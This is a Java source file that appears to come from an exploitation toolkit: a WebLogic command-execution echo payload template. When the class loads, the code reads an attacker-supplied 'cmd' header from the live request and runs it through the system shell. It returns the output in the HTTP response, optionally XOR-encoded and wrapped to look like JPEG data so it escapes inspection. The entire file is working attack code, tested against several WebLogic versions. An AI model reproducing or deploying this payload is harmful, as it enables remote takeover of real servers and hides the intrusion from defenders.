package jeg.core.template.weblogic;

import jeg.core.template.undertow.UndertowCmdExecTpl;

import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Scanner;

/**
 * test in weblogic 10.3.6.0/12.1.3.0/12.2.1.3.0
 */
public class WebLogicCmdExecTpl {
    static {
        new WebLogicCmdExecTpl();
    }
    // 传参：需要执行的命令
    private String getReqHeaderName() {
        return "cmd";
    }


    public WebLogicCmdExecTpl() {
        run();
    }

    private void run(){
        String command = null;
        Thread thread = Thread.currentThread();
        Object target = null;
        PrintWriter writer = null;
        try {
            target = invokeMethod(thread, "getCurrentWork", new Class[0], new Object[0]);
            command = (String) invokeMethod(target, "getHeader", new Class[]{String.class}, new Object[]{getReqHeaderName()});
            Object response = invokeMethod(target, "getResponse", new Class[0], new Object[0]);
            writer = (PrintWriter) invokeMethod(response, "getWriter", new Class[0], new Object[0]);
        } catch (Exception e) {
            try {
                Object connectionHandler = getFV(target, "connectionHandler");
                Object request = invokeMethod(connectionHandler, "getServletRequest", new Class[0], new Object[0]);
                if (command == null) {
                    command = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{getReqHeaderName()});
                }
                Object response = invokeMethod(connectionHandler, "getServletResponse", new Class[0], new Object[0]);
                writer = (PrintWriter) invokeMethod(response, "getWriter", new Class[0], new Object[0]);
            } catch (Exception ignored) {
            }
        }
        String execRes = "error";
        try {
            // 执行命令
            execRes = handle(command);
        }catch (Exception e){

        }
        // 回显执行结果
        writer.write(execRes);
        writer.flush();
        writer.close();
    }

    private static String handle(String param) throws Exception {
        String encTag = "eyJeXA";
        
        String cmd = null;

        if (param.startsWith(encTag)) {
            // 控制混淆长度标识数量，字符1代表
            int num = Integer.parseInt(String.valueOf(param.charAt(encTag.length())));

            // 混淆字符串的总和长度
            int count = 0;
            for (int i = 0; i < num; i++) {
                count += param.charAt(encTag.length() + 1 + i);
            }

            // 请求参数格式：eyJ0eXA[string数字标识后面参数的长度][控制随机混淆字符串的长度ascii值][混淆字符串][xor+base64 命令字符串].[随机字符串]
            // param => base64decode => xor => exec() => xor => base64encode
            cmd = new String(x(base64Decode(param.substring(encTag.length() + 1 + num + count, param.indexOf(".")))));
            return "/9j/4A" + base64Encode(x(exec(cmd).getBytes())) + "/9k==";
        } else {
            return exec(param);
        }

    }

    private static byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception var4) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke((Object) null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }


    public static String base64Encode(byte[] input) throws Exception {
        String value = null;
        Class base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", (Class[]) null).invoke(base64, (Object[]) null);
            value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, input);
        } catch (Exception var6) {
            base64 = Class.forName("sun.misc.BASE64Encoder");
            Object Encoder = base64.newInstance();
            value = (String) Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, input);
        }
        return value;
    }

    public static byte[] x(byte[] data) {
        byte[] key = "???????????????".getBytes();
        byte[] result = new byte[data.length];
        for (int i = 0; i < data.length; i++) {
            result[i] = (byte) (data[i] ^ key[i % key.length]);
        }
        return result;
    }

    // 执行模块
    public static String exec(String cmd){
        try {
            boolean isLinux = true;
            String osType = System.getProperty("os.name");
            if (osType != null && osType.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"/bin/sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String execRes = "";
            while (s.hasNext()) {
                execRes += s.next();
            }
            return execRes;
        }catch (Exception e){
            return e.getMessage();
        }
    }

    private synchronized Object getFV(final Object o, final String s) throws Exception {
        Field declaredField = null;
        Class<?> clazz = o.getClass();
        while (clazz != Object.class) {
            try {
                declaredField = clazz.getDeclaredField(s);
                break;
            } catch (NoSuchFieldException ex) {
                clazz = clazz.getSuperclass();
            }
        }
        if (declaredField == null) {
            throw new NoSuchFieldException(s);
        }
        declaredField.setAccessible(true);
        return declaredField.get(o);
    }


    private synchronized Object invokeMethod(final Object obj, final String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Method method = null;
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                method = clazz.getDeclaredMethod(methodName, paramClazz);
                break;
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }

        if (method == null) {
            throw new NoSuchMethodException(methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj, param);
    }
}
